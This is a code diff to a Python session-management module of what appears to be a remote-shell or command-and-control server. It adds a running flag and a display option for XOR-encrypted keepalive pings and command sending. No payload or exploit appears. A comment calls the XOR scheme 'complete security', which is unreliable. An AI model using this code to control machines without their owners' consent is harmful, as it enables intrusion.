@@ -13,6 +13,9 @@ from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMI
 
 class Management(threading.Thread):
     is_life = "is_life?" 
+    
+    running = True
+
     """
     Send is life. (ping)
     If the customer responds when he wants.
@@ -37,7 +40,7 @@ class Management(threading.Thread):
 
                 #print("TEST SOCK--->",bool(Handler.dict_conn[key][NB_SOCKET]))
                 
-                if(Handler.dict_conn[key][NB_ALIVE] and bool(Handler.dict_conn[key][NB_SOCKET]) and not Handler.dict_conn[key][NB_SELECT]): #If the connection is alive (True) and the socket object is active (True)
+                if(Handler.dict_conn[key][NB_ALIVE] and bool(Handler.dict_conn[key][NB_SOCKET]) and not Handler.dict_conn[key][NB_SELECT] and Management.running): #If the connection is alive (True) and the socket object is active (True)
 
                     try:
                         Handler.dict_conn[key][NB_SOCKET].send(XOREncryption(Management.is_life, Handler.PBKDF2_Key).encode())
@@ -57,8 +60,8 @@ class Management(threading.Thread):
                     pass 
 
 class CheckConn:
-    #his class allows you to send and receive data on the network in complete security.
     
+    #his class allows you to send and receive data on the network in complete security.
     def connexionIsDead(self, nb_session):
         #print(Handler.dict_conn[nb_session][3])
         Handler.dict_conn[nb_session][NB_ALIVE] = False
@@ -66,12 +69,12 @@ class CheckConn:
         Handler.dict_conn[nb_session][NB_PORT] = "---"
 
         Handler.dict_conn[nb_session][NB_SELECT] = False #test
-
         #self.NewObjSql.updateValue("is_he_alive","False",nb_session,True) #Faut-il changer les valeurs de la db en temps reel ? Ou changer les valeurs lors de l'inialisation du script ?
         #self.NewObjSql.closeConn()
         
 
-    def sendsafe(self, nb_session, sock, payload):
+    def sendsafe(self, nb_session, sock, payload, display=True): #display = Avoids display bugs (useful in broadcast mode)
+        
         '''
         Checks if the socket sending is not lost.
         Example: If the server sending MOD_SHELL is that at the moment the connection is cut then this function is really useful.
@@ -79,10 +82,11 @@ class CheckConn:
         
         Returns true if the socket was sent if not retrun false if there was a problem.
         '''
+        
         try:
             sock.send(XOREncryption(payload, Handler.PBKDF2_Key).encode())
         except ConnectionError as connerr: #If the connection does not answer
-            if(Handler.status_connection_display):
+            if(Handler.status_connection_display and display):
                 printColor("error","[-] The connection to the client was cut {}:{}.\n".format(Handler.dict_conn[nb_session][NB_IP],Handler.dict_conn[nb_session][NB_PORT]))
             self.connexionIsDead(nb_session)
             return False
